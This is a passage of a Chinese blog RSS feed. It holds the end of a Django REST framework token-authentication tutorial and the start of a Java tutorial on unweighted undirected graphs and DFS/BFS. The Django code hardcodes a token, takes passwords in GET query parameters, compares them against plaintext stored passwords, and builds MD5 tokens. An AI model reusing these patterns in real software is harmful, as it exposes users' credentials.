-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyAuthtication(BasicAuthentication):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; authenticate(self, request):
-        token &lt;/span&gt;= request.query_params.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;token&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;注意是没有GET的，用query_params表示&lt;/span&gt;
-        &lt;span&gt;if&lt;/span&gt; token == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;zxxzzxzc&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
-            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;uuuuuu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;afsdsgdf&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;返回user，auth&lt;/span&gt;
-        &lt;span&gt;raise&lt;/span&gt; APIException(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;认证错误&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserView(APIView):
-    authentication_classes &lt;/span&gt;=&lt;span&gt; [MyAuthtication,]
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(request.user)
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(request.auth)
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;用户列表&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2&gt;2、应用：&lt;/h2&gt;
-&lt;p&gt;主要是做Token验证  url中as_view里面调用了dispatch方法。&lt;/p&gt;
-&lt;p&gt;可以有两种方式&lt;/p&gt;
-&lt;h3&gt;局部使用&lt;/h3&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('45b99cfd-edd4-4d93-8b8c-93bcda957c2d')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_45b99cfd-edd4-4d93-8b8c-93bcda957c2d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_45b99cfd-edd4-4d93-8b8c-93bcda957c2d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('45b99cfd-edd4-4d93-8b8c-93bcda957c2d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_45b99cfd-edd4-4d93-8b8c-93bcda957c2d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; app01 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url
-urlpatterns &lt;/span&gt;=&lt;span&gt; [
-    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; django rest framework&lt;/span&gt;
-    url(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^hosts/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.HostView.as_view()),
-    url(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^auth/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, views.AuthView.as_view()),
-]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;urls.py&lt;/span&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('ff3aa406-0247-4ef9-8103-05f059fb51aa')&quot; readability=&quot;45.5&quot;&gt;&lt;img id=&quot;code_img_closed_ff3aa406-0247-4ef9-8103-05f059fb51aa&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_ff3aa406-0247-4ef9-8103-05f059fb51aa&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('ff3aa406-0247-4ef9-8103-05f059fb51aa',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ff3aa406-0247-4ef9-8103-05f059fb51aa&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;86&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt; django.shortcuts &lt;span&gt;import&lt;/span&gt;&lt;span&gt; render,HttpResponse
-&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; Create your views here.&lt;/span&gt;
-&lt;span&gt;from&lt;/span&gt; rest_framework.views &lt;span&gt;import&lt;/span&gt;&lt;span&gt;  APIView
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.views &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Request
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.authentication &lt;span&gt;import&lt;/span&gt;&lt;span&gt; SessionAuthentication
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.authentication &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BaseAuthentication, BasicAuthentication
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.parsers &lt;span&gt;import&lt;/span&gt;&lt;span&gt; JSONParser
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.negotiation &lt;span&gt;import&lt;/span&gt;&lt;span&gt;  DefaultContentNegotiation
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.exceptions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; APIException
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; app01 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; models
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.response &lt;span&gt;import&lt;/span&gt; Response  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;友好的显示返回结果&lt;/span&gt;
-
-
-
-&lt;span&gt;class&lt;/span&gt;&lt;span&gt; AuthView(APIView):
-    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;auth登录页面不需要验证，可设置&lt;/span&gt;
-    authentication_classes = []  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;登录页面不需要认证&lt;/span&gt;
-    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; get(self,request):
-        &lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
-        接收用户名和密码
-        :param request:
-        :return:
-        &lt;/span&gt;&lt;span&gt;'''&lt;/span&gt;&lt;span&gt;
-        ret &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:1000,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:None}
-        user &lt;/span&gt;= request.query_params.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;username&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-
-        pwd &lt;/span&gt;= request.query_params.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;password&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(user,pwd)
-        obj &lt;/span&gt;= models.UserInfo.objects.filter(username=user,password=&lt;span&gt;pwd).first()
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(obj)
-        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; obj :
-            ret[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = 1001&lt;span&gt;
-            ret[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;用户名或者密码错误&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
-            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; Response(ret)
-        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;创建随机字符串&lt;/span&gt;
-        &lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
-        &lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; hashlib
-        ctime &lt;/span&gt;=&lt;span&gt; time.time()
-        key &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%s|%s&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;%&lt;span&gt;(user,ctime)
-        m &lt;/span&gt;=&lt;span&gt; hashlib.md5()
-        m.update(key.encode(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
-        token &lt;/span&gt;=&lt;span&gt; m.hexdigest()
-
-        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;保存数据&lt;/span&gt;
-        obj.token =&lt;span&gt; token
-        obj.save()
-
-        ret[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;token&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] =&lt;span&gt; token
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Response(ret)
-
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; HostView(APIView):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; dispatch(self, request, *args, **&lt;span&gt;kwargs):
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; super().dispatch(request, *args, **&lt;span&gt;kwargs)
-
-    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; authentication_classes = [MyAuthtication]&lt;/span&gt;
-
-    &lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(request.user,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;dddddddddddffffff&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(request.auth,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;dddddddddd&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;原来的request，django.core.handlers.wsgi.WSGIRequest&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;现在的request ,rest_framework.request.Request&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request)&lt;/span&gt;
-        authentication_classes =&lt;span&gt; [SessionAuthentication,BaseAuthentication]
-        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(self.authentication_classes)  # [&amp;lt;class 'rest_framework.authentication.SessionAuthentication'&amp;gt;,&lt;/span&gt;
-                                            &lt;span&gt;#&lt;/span&gt;&lt;span&gt;  &amp;lt;class 'rest_framework.authentication.BasicAuthentication'&amp;gt;]&lt;/span&gt;
-        &lt;span&gt;return&lt;/span&gt; HttpResponse(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;GET请求的响应内容&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; post(self,request,*args,**&lt;span&gt;kwargs):
-        &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; try:&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;     try :&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;         current_page = request.POST.get(&quot;page&quot;)&lt;/span&gt;
-        &lt;span&gt;#
-&lt;/span&gt;        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;         current_page = int(current_page)&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;         int(&quot;asd&quot;)&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;     except ValueError as e:&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;         print(e)&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;         raise #如果有raise说明自己处理不了了，就交给下面的一个去捕捉了&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; except Exception as e:&lt;/span&gt;
-        &lt;span&gt;#&lt;/span&gt;&lt;span&gt;     print(&quot;OK&quot;)&lt;/span&gt;
-
-
-        &lt;span&gt;return&lt;/span&gt;  HttpResponse(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;post请求的响应内容&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; put(self, request, *args, **&lt;span&gt;kwargs):
-        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; HttpResponse(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;put请求的响应内容&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;Views.py&lt;/span&gt;&lt;/div&gt;
-&lt;h3&gt;全局使用&lt;/h3&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('2cac620d-3646-4878-a737-4e1b4596601d')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_2cac620d-3646-4878-a737-4e1b4596601d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_2cac620d-3646-4878-a737-4e1b4596601d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('2cac620d-3646-4878-a737-4e1b4596601d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_2cac620d-3646-4878-a737-4e1b4596601d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;#&lt;/span&gt;&lt;span&gt;注册认证类&lt;/span&gt;
-REST_FRAMEWORK =&lt;span&gt; {
-    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;UNAUTHENTICATED_USER&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: None,
-    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;UNAUTHENTICATED_TOKEN&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: None,  &lt;span&gt;#&lt;/span&gt;&lt;span&gt;将匿名用户设置为None&lt;/span&gt;
-    &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DEFAULT_AUTHENTICATION_CLASSES&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: [
-        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app01.utils.MyAuthentication&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
-    ],
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;settings&lt;/span&gt;&lt;/div&gt;
-&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('35b15fc9-83d0-40aa-822d-272c82458d17')&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_35b15fc9-83d0-40aa-822d-272c82458d17&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_35b15fc9-83d0-40aa-822d-272c82458d17&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('35b15fc9-83d0-40aa-822d-272c82458d17',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_35b15fc9-83d0-40aa-822d-272c82458d17&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;from&lt;/span&gt;  rest_framework.authentication &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BaseAuthentication
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.exceptions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; APIException
-&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; app02 &lt;span&gt;import&lt;/span&gt;&lt;span&gt; models
-
-
-&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyAuthentication(BaseAuthentication):
-    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; authenticate(self, request):
-        token&lt;/span&gt;=request.query_params.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;token&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(token)
-        obj&lt;/span&gt;=models.UserInfo.objects.filter(token=&lt;span&gt;token).first()
-        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(obj)
-        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; obj:
-            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (obj.username,obj)
-        &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;  APIException(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;没有通过验证&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
-&lt;/pre&gt;&lt;/div&gt;
-&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;全局验证&lt;/span&gt;&lt;/div&gt;
-&lt;p&gt;注：rest_framewor是一个app需要settings里面设置。&lt;/p&gt;
-</description>
-<pubDate>Wed, 14 Feb 2018 10:52:00 +0000</pubDate>
-<dc:creator>听风。</dc:creator>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/huchong/p/8448639.html</dc:identifier>
-</item>
-<item>
-<title>Java数据结构和算法（十五）——无权无向图 - YSOcean</title>
-<link>http://www.cnblogs.com/ysocean/p/8032659.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/ysocean/p/8032659.html</guid>
-<description>&lt;p&gt;　　前面我们介绍了树这种数据结构，树是由n（n&amp;gt;0）个有限&lt;strong&gt;节点&lt;/strong&gt;通过连接它们的&lt;strong&gt;边&lt;/strong&gt;组成一个具有层次关系的集合，把它叫做“树”是因为它看起来像一棵倒挂的树，包括二叉树、红黑树、2-3-4树、堆等各种不同的树，有对这几种树不了解的可以参考我前面几篇博客。而本篇博客我们将介绍另外一种数据结构——图，图也是计算机程序设计中最常用的数据结构之一，从数学意义上讲，树是图的一种，大家可以对比着学习。&lt;/p&gt;
-&lt;h3&gt;1、图的定义&lt;/h3&gt;
-&lt;p&gt;　　我们知道，前面讨论的数据结构都有一个框架，而这个框架是由相应的算法实现的，比如二叉树搜索树，左子树上所有结点的值均小于它的根结点的值，右子树所有结点的值均大于它的根节点的值，类似这种形状使得它容易搜索数据和插入数据，树的边表示了从一个节点到另一个节点的快捷方式。&lt;/p&gt;
-&lt;p&gt;　　而图通常有个固定的形状，这是由物理或抽象的问题所决定的。比如图中节点表示城市，而边可能表示城市间的班机航线。如下图是美国加利福利亚简化的高速公路网：&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209213532810-1976605857.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;h4&gt;　　①、邻接：&lt;/h4&gt;
-&lt;p&gt;　　如果两个顶点被同一条边连接，就称这两个顶点是邻接的，如上图 I 和 G 就是邻接的，而 I 和 F 就不是。有时候也将和某个指定顶点邻接的顶点叫做它的邻居，比如顶点 G 的邻居是 I、H、F。&lt;/p&gt;
-&lt;h4&gt;　　②、路径：&lt;/h4&gt;
-&lt;p&gt;　　路径是边的序列，比如从顶点B到顶点J的路径为 BAEJ，当然还有别的路径 BCDJ，BACDJ等等。&lt;/p&gt;
-&lt;h4&gt;　　③、连通图和非连通图：&lt;/h4&gt;
-&lt;p&gt;　　如果至少有一条路径可以连接起所有的顶点，那么这个图称作连通的；如果假如存在从某个顶点不能到达另外一个顶点，则称为非联通的。&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209214423326-603786123.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;h4&gt;　　④、有向图和无向图：&lt;/h4&gt;
-&lt;p&gt;　　如果图中的边没有方向，可以从任意一边到达另一边，则称为无向图；比如双向高速公路，A城市到B城市可以开车从A驶向B，也可以开车从B城市驶向A城市。但是如果只能从A城市驶向B城市的图，那么则称为有向图。&lt;/p&gt;
-&lt;h4&gt;　　⑤、有权图和无权图：&lt;/h4&gt;
-&lt;p&gt;　　图中的边被赋予一个权值，权值是一个数字，它能代表两个顶点间的物理距离，或者从一个顶点到另一个顶点的时间，这种图被称为有权图；反之边没有赋值的则称为无权图。&lt;/p&gt;
-&lt;p&gt;　　本篇博客我们讨论的是无权无向图。&lt;/p&gt;
-&lt;h3&gt;2、在程序中表示图&lt;/h3&gt;
-&lt;p&gt;　　我们知道图是由顶点和边组成，那么在计算机中，怎么来模拟顶点和边？&lt;/p&gt;
-&lt;h4&gt;　　①、顶点：&lt;/h4&gt;
-&lt;p&gt;　　在大多数情况下，顶点表示某个真实世界的对象，这个对象必须用数据项来描述。比如在一个飞机航线模拟程序中，顶点表示城市，那么它需要存储城市的名字、海拔高度、地理位置和其它相关信息，因此通常用一个顶点类的对象来表示一个顶点，这里我们仅仅在顶点中存储了一个字母来标识顶点，同时还有一个标志位，用来判断该顶点有没有被访问过（用于后面的搜索）。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
-&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
-/**
- * 顶点类
- * @author vae
- */
-public class Vertex {
-        public char label;
-        public boolean wasVisited;
-        
-        public Vertex(char label){
-                this.label = label;
-                wasVisited = false;
-        }
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　顶点对象能放在数组中，然后用下标指示，也可以放在链表或其它数据结构中，不论使用什么结构，存储只是为了使用方便，这与边如何连接点是没有关系的。&lt;/p&gt;
-&lt;h4&gt;　　②、边：&lt;/h4&gt;
-&lt;p&gt;　　在前面讲解各种树的数据结构时，大多数树都是每个节点包含它的子节点的引用，比如红黑树、二叉树。也有用数组表示树，树组中节点的位置决定了它和其它节点的关系，比如堆就是用数组表示。&lt;/p&gt;
-&lt;p&gt;　　然而图并不像树，图没有固定的结构，图的每个顶点可以与任意多个顶点相连，为了模拟这种自由形式的组织结构，用如下两种方式表示图：邻接矩阵和邻接表（如果一条边连接两个顶点，那么这两个顶点就是邻接的）&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209221659888-720670354.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;　　&lt;strong&gt;邻接矩阵：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;　　邻接矩阵是一个二维数组，数据项表示两点间是否存在边，如果图中有 N 个顶点，邻接矩阵就是 N*N 的数组。上图用邻接矩阵表示如下：&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209221722904-1549384558.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　1表示有边，0表示没有边，也可以用布尔变量true和false来表示。顶点与自身相连用 0 表示，所以这个矩阵从左上角到右上角的对角线全是 0 。&lt;/p&gt;
-&lt;p&gt;　　注意：这个矩阵的上三角是下三角的镜像，两个三角包含了相同的信息，这个冗余信息看似低效，但是在大多数计算机中，创造一个三角形数组比较困难，所以只好接受这个冗余，这也要求在程序处理中，当我们增加一条边时，比如更新邻接矩阵的两部分，而不是一部分。&lt;/p&gt;
-&lt;p&gt;　　&lt;strong&gt;邻接表：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;　　邻接表是一个链表数组（或者是链表的链表），每个单独的链表表示了有哪些顶点与当前顶点邻接。&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209222328123-1963427649.png&quot; alt=&quot;&quot;/&gt;　　&lt;/p&gt;
-&lt;h3&gt;3、搜索 &lt;/h3&gt;
-&lt;p&gt;　　在图中实现最基本的操作之一就是搜索从一个指定顶点可以到达哪些顶点，比如从武汉出发的高铁可以到达哪些城市，一些城市可以直达，一些城市不能直达。现在有一份全国高铁模拟图，要从某个城市（顶点）开始，沿着铁轨（边）移动到其他城市（顶点），有两种方法可以用来搜索图：深度优先搜索（DFS）和广度优先搜索（BFS）。它们最终都会到达所有连通的顶点，深度优先搜索通过栈来实现，而广度优先搜索通过队列来实现，不同的实现机制导致不同的搜索方式。&lt;/p&gt;
-&lt;h4&gt;　　①、深度优先搜索（DFS）&lt;/h4&gt;
-&lt;p&gt;　　深度优先搜索算法有如下规则：&lt;/p&gt;
-&lt;p&gt;　　规则1：如果可能，访问一个邻接的未访问顶点，标记它，并将它放入栈中。&lt;/p&gt;
-&lt;p&gt;　　规则2：当不能执行规则 1 时，如果栈不为空，就从栈中弹出一个顶点。&lt;/p&gt;
-&lt;p&gt;　　规则3：如果不能执行规则 1 和规则 2 时，就完成了整个搜索过程。&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180209225344107-1667286888.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　对于上图，应用深度优先搜索如下：假设选取 A 顶点为起始点，并且按照字母优先顺序进行访问，那么应用规则 1 ，接下来访问顶点 B，然后标记它，并将它放入栈中；再次应用规则 1，接下来访问顶点 F，再次应用规则 1，访问顶点 H。我们这时候发现，没有 H 顶点的邻接点了，这时候应用规则 2，从栈中弹出 H，这时候回到了顶点 F，但是我们发现 F 也除了 H 也没有与之邻接且未访问的顶点了，那么再弹出 F，这时候回到顶点 B，同理规则 1 应用不了，应用规则 2，弹出 B，这时候栈中只有顶点 A了，然后 A 还有未访问的邻接点，所有接下来访问顶点 C，但是 C又是这条线的终点，所以从栈中弹出它，再次回到 A，接着访问 D,G,I，最后也回到了 A，然后访问 E，但是最后又回到了顶点 A，这时候我们发现 A没有未访问的邻接点了，所以也把它弹出栈。现在栈中已无顶点，于是应用规则 3，完成了整个搜索过程。&lt;/p&gt;
-&lt;p&gt;　　深度优先搜索在于能够找到与某一顶点邻接且没有访问过的顶点。这里以邻接矩阵为例，找到顶点所在的行，从第一列开始向后寻找值为1的列；列号是邻接顶点的号码，检查这个顶点是否未访问过，如果是这样，那么这就是要访问的下一个顶点，如果该行没有顶点既等于1（邻接）且又是未访问的，那么与指定点相邻接的顶点就全部访问过了（后面会用算法实现）。&lt;/p&gt;
-&lt;h4&gt;　　②、广度优先搜索（BFS）&lt;/h4&gt;
-&lt;p&gt;　　深度优先搜索要尽可能的远离起始点，而广度优先搜索则要尽可能的靠近起始点，它首先访问起始顶点的所有邻接点，然后再访问较远的区域，这种搜索不能用栈实现，而是用队列实现。&lt;/p&gt;
-&lt;p&gt;　　规则1：访问下一个未访问的邻接点（如果存在），这个顶点必须是当前顶点的邻接点，标记它，并把它插入到队列中。&lt;/p&gt;
-&lt;p&gt;　　规则2：如果已经没有未访问的邻接点而不能执行规则 1 时，那么从队列列头取出一个顶点（如果存在），并使其成为当前顶点。&lt;/p&gt;
-&lt;p&gt;　　规则3：如果因为队列为空而不能执行规则 2，则搜索结束。&lt;/p&gt;
